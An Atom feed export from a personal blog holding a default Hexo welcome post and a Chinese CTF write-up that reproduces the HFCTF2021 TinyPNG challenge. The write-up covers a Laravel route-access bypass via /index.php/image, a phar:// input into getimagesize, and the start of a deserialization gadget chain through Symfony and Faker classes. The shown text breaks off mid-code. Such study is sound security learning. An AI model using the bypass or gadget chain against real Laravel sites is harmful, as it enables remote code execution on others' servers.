<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liki4</title>
  
  
  <link href="https://me.liki.link/atom.xml" rel="self"/>
  
  <link href="https://me.liki.link/"/>
  <updated>2020-10-06T16:30:56.000Z</updated>
  <id>https://me.liki.link/</id>
  
  <author>
    <name>Liki4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://me.liki.link/20210610/hello-world/"/>
    <id>https://me.liki.link/20210610/hello-world/</id>
    <published>2021-06-10T09:02:43.925Z</published>
    <updated>2020-10-06T16:30:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HFCTF2021 TinyPNG 复现</title>
    <link href="https://me.liki.link/20210429/HFCTF2021-TinyPNG/"/>
    <id>https://me.liki.link/20210429/HFCTF2021-TinyPNG/</id>
    <published>2021-04-29T11:14:59.000Z</published>
    <updated>2021-05-18T11:55:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2021-TinyPNG"><a href="#HFCTF2021-TinyPNG" class="headerlink" title="HFCTF2021 TinyPNG"></a>HFCTF2021 TinyPNG</h2><p>感谢 Naivekun 师傅的帮助</p><p>因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样</p><p>docker 环境我会放在我的 GitHub 上，<a href="https://github.com/ChrisLiKaiyuan/HFCTF2021_TinyPNG">复现环境</a></p><h3 id="2021-05-18-更新："><a href="#2021-05-18-更新：" class="headerlink" title="2021-05-18 更新："></a><strong>2021-05-18 更新：</strong></h3><p>更新的部分，往下到结尾。</p><p>ZeddYu 师傅说将 HTTP2 走私的环境放到 GitHub 上了，<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab">H2走私环境</a></p><h2 id="阅读源码"><a href="#阅读源码" class="headerlink" title="阅读源码"></a>阅读源码</h2><p>先阅读源码，搞清楚这个 Web 应用的具体功能和流程</p><p>Laravel 框架的默认路由位于 <code>routes/web.php</code> 下 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//...    </span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以很容易得到这个应用有三条路由</p><p>第一条路由是返回 <code>upload</code> 页面，视图文件位于 <code>resources/views/*</code></p><p>其他两条路由，分别看他们对应的类和方法，位于 <code>app/Http/Controllers/*</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/IndexController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fileUpload</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$req</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$allowed_extension</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">clientExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">===</span> <span class="token variable">$allowed_extension</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>                <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">storePubliclyAs</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"path: <span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'File has been uploaded.'</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>IndexController</code> 的 <code>fileUpload</code> 方法实现了一个文件上传的功能</p><ul><li><p>上传的文件后缀名只能以 <code>.png</code> 结尾</p></li><li><p>上传的文件会被存储在 <code>public/uploads</code>文件夹内，文件名不可控，为 <code>\md5(time()) . &#39;.png&#39;</code></p></li><li><p>对 <code>&lt;?</code>、<code>php</code>、<code>HALT_COMPILER</code> 字符串进行了过滤</p></li><li><p>上传成功后会返回储存的路径</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/ImageController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImageController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$source</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, pvlease'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$image_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>            <span class="token variable">$dst_img</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/'</span> <span class="token operator">.</span> <span class="token variable">$image_name</span><span class="token punctuation">;</span>            <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">imgcompress</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$dst_img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image_name'</span><span class="token punctuation">,</span> <span class="token variable">$image_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ImageController</code> 的 <code>handle</code> 方法实现了一个压缩图片的功能</p><ul><li><strong>实现了，但又没有完全实现</strong></li><li>读取 Request 中传入的 <code>image</code> 作为目标图片路径</li><li>读取该图片，调用 <code>imgcompress</code> 类中的 <code>compressImg</code> 方法对图片进行压缩</li><li>压缩完成后返回图片的路径</li></ul><p>在来看看调用的 <code>imgcompress</code> 类，因为比较长，所以截取关键部分贴上来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/imgcompress.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">imgcompress</span><span class="token punctuation">&#123;</span><span class="token comment">//...</span>    <span class="token comment">/**     * 内部：打开图片     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$width</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$height</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'attr'</span> <span class="token operator">=></span> <span class="token variable">$attr</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"imagecreatefrom"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//...</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>_openImage</code> 方法中，<code>getimagesize</code> 函数会打开一个文件</p><p>而且在 PHP 4.0.5 支持后支持通过 URL 打开</p><p><img src="image-20210430115828.png" alt="image-20210430115828" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430115828.png" class="lozad post-image"></p><p>于是这里我们就可以夹带私货了，比如说 <code>phar://</code></p><h2 id="修洞"><a href="#修洞" class="headerlink" title="修洞"></a>修洞</h2><p>先看路由 <code>routes/web.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 <code>//Don&#39;t expose the /image to others!</code></p><p>所以修洞很简单，直接注释掉<code>/image</code>路由即可</p><h2 id="打洞"><a href="#打洞" class="headerlink" title="打洞"></a>打洞</h2><p>题目给了<code>Apache</code>的配置文件，开启了目录重写</p><p>所以访问<code>/index.php/image</code>即可访问到<code>/image</code>路由</p><p>我一开始看这个题目配了 HTTPS，想起来 4qE 比赛之前给我发的那篇推文，以为要打一个走私。结果是这样就绕过了。</p><p>然后这一题可以上传文件，可以读取文件，打一个 <strong>phar 反序列化</strong></p><p>参考文章：<a href="https://xz.aliyun.com/t/9318">一道CTF题引起的对laravel v8.32.1序列化利用链挖掘</a></p><p>题目环境里给出了 Laravel 的版本</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"^7.3|^8.0"</span><span class="token punctuation">,</span>        <span class="token property">"fideloper/proxy"</span><span class="token operator">:</span> <span class="token string">"^4.4"</span><span class="token punctuation">,</span>        <span class="token property">"fruitcake/laravel-cors"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span><span class="token punctuation">,</span>        <span class="token property">"guzzlehttp/guzzle"</span><span class="token operator">:</span> <span class="token string">"^7.0.1"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/framework"</span><span class="token operator">:</span> <span class="token string">"^8.12"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/tinker"</span><span class="token operator">:</span> <span class="token string">"^2.5"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以照文章找一条链下来是个不错的选择</p><h3 id="ImportConfigurator-类"><a href="#ImportConfigurator-类" class="headerlink" title="ImportConfigurator 类"></a>ImportConfigurator 类</h3><p>第一个是 <code>Symfony\Component\Routing\Loader\Configurator</code> 中的类 <code>ImportConfigurator</code></p><p>该类存在一个包含了语句 <code>$this-&gt;xxx-&gt;xxx()</code> 的 <code>__destruct</code> 方法</p><p>这样我们可以控制 <code>$this-&gt;xxx</code>，从而执行一些预期之外的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为函数名不可控，找一个有 <code>__call</code> 方法的类</p><p>比如说 <code>Faker</code> 中的类 <code>ValidGenerator</code></p><h3 id="ValidGenerator-类"><a href="#ValidGenerator-类" class="headerlink" title="ValidGenerator 类"></a>ValidGenerator 类</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/ValidGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选用这个类是因为这个 <code>__call</code> 方法中包含了清晰可见的 <code>call_user_func_array</code> 和 <code>call_user_func</code></p><p>可以发现 <code>call_user_func</code> 的参数 <code>$this-&gt;validator</code> 是可控的</p><p>而另一个参数 <code>$res</code> 是从 <code>call_user_func_array</code> 函数中获得的返回值</p><p><code>call_user_func_array</code> 的参数中，<code>$this-&gt;generator</code> 是可控的</p><p>但我们无法控制他的返回值，即无法控制 <code>$res</code></p><p>另一个参数 <code>$name</code> 是不可控的，且值为 <code>addCollection</code></p><p>另外我们为了触发一次 <code>call_user_func</code>，这里选择将 <code>$this-&gt;MaxRetries</code> 置为 1 即可</p><p><img src="image-20210430163442769.png" alt="image-20210430163442769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430163442769.png" class="lozad post-image"></p><h3 id="DefaultGenerator-类"><a href="#DefaultGenerator-类" class="headerlink" title="DefaultGenerator 类"></a>DefaultGenerator 类</h3><p>我们再看到 <code>Faker</code> 中的类 <code>DefaultGenerator</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token 